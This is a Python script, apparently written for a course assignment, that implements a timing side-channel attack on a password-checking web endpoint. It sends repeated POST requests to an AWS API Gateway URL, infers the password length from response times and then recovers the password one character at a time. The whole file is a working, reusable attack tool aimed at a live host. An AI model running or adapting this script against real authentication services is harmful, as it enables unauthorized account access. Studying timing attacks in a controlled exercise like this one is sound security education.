import requests   
import json 
from concurrent.futures import ProcessPoolExecutor, ThreadPoolExecutor, wait, ALL_COMPLETED
from string import digits, ascii_letters 
import sys

class TimeAttacker:
    def __init__(self, attack_params):
        self.host = attack_params['url']
        self.alphabet = attack_params['alphabet']
        self.max_password_length = attack_params['max_password_length']
        self.min_password_length = attack_params['min_password_length']
        self.correct_first_substrings_by_len = {}
        self.password_cracked = False 
        self.current_max_time = 0 
 
    def guess_password_repeated(self, pwd, repeat=50):
        total_time = 0 
        print(f'Guessing password "{pwd}" of len {len(pwd)} - {repeat} times')
        # threading makes the timing way too wonky. very inaccurate results
        # with ThreadPoolExecutor(max_workers=50) as executor:
        #     futures = [executor.submit(self.guess_password, pwd) for _ in range(repeat)]
        # for f in wait(futures, return_when=ALL_COMPLETED).done:
        #     total_time += f.result() 
        for _ in range(repeat):
            total_time += self.guess_password(pwd)
        return total_time 

    def guess_password(self, pwd):  
        d = {'pwd': pwd}   
        response = requests.post(url=self.host, data=json.dumps(d))    
        response_time = response.elapsed.microseconds
        if response.status_code == 200:
            print(f'Correct password found: {pwd}')
            sys.exit(0)
        return response_time 

    def get_next_letter(self, already_cracked, padding_length): 
        print(f'get_next_letter({already_cracked}, {padding_length})')
        response_times_by_character = {k: 0 for k in self.alphabet}
        with ProcessPoolExecutor(max_workers=6) as executor: 
            futures = {executor.submit(
                self.guess_password_repeated, 
                already_cracked + char + '-' * padding_length): char for char in self.alphabet}
            for future in wait(futures, return_when=ALL_COMPLETED).done:
                char = futures[future]
                response_time = future.result() 
                response_times_by_character[char] += response_time  
        _sorted = sorted(response_times_by_character, key=response_times_by_character.get, reverse=True)
        print(f'_sorted = {_sorted}')
        return _sorted[0]

    def get_correct_length(self):
        """ use nothing but padding for the password request at varying lengths within expected bounds
        maximum average response time indicates correct length """
        times = {}
        for length in range(self.min_password_length, self.max_password_length + 1):
            times[length] = 0 
            pwd = "-" * length
            times[length] += self.guess_password_repeated(pwd, repeat=50) 
        _sorted = sorted(times, key=times.get, reverse=True)
        print(f'_sorted = {_sorted}')
        return _sorted[0]

    def attack(self): 
        correct_length = self.get_correct_length()
        print(f'Correct length appears to be {correct_length}. Guessing passwords of this length.')  
        padding_length = correct_length - 1
        cracked_letters = ''
        for _ in range(padding_length): 
            cracked_letters += self.get_next_letter(
                already_cracked=cracked_letters, 
                padding_length=padding_length)
            padding_length -= 1 
        cracked_letters += self.get_next_letter(
                already_cracked=cracked_letters, 
                padding_length=0)
        print(cracked_letters) 

if __name__ == "__main__": 
        
    REAL_HOST = "https://qrxjmztf2h.execute-api.us-west-2.amazonaws.com/prod"
    DEMO_HOST = "https://qrxjmztf2h.execute-api.us-west-2.amazonaws.com/prod/example"
    attack_params = {
        'demo': {
            'url': DEMO_HOST,
            'max_password_length': 12,
            'min_password_length': 12,
            'alphabet': digits + ascii_letters
        },
        'assignment': {
            'url': REAL_HOST,
            'max_password_length': 13,
            'min_password_length': 11,
            'alphabet': digits  
        }
    }
    demo_attacker = TimeAttacker(attack_params=attack_params['assignment'])   
    demo_attacker.attack() 